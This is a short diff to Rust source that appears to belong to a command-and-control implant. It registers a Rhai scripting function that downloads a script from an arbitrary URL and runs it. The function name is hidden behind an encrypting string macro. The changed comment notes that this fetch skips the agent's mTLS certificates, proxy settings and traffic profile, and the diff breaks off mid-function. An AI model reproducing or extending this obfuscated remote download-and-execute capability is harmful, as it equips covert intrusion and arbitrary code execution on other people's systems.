@@ -20,7 +20,9 @@ pub fn register(engine: &mut Engine) {
     });
 
     // Download a Rhai script from a URL and execute it.
-    // Accepts any HTTP/HTTPS URL; uses the agent's configured reqwest client.
+    // Accepts any HTTP/HTTPS URL. NOTE: this uses a bare reqwest client -
+    // the agent's mTLS certs, proxy config, and traffic profile do NOT
+    // apply to this fetch.
     engine.register_fn(&aes_str!("internal_load_script"), |url: &str| -> String {
         let script = match reqwest::blocking::get(url) {
             Ok(r)  => match r.text() {
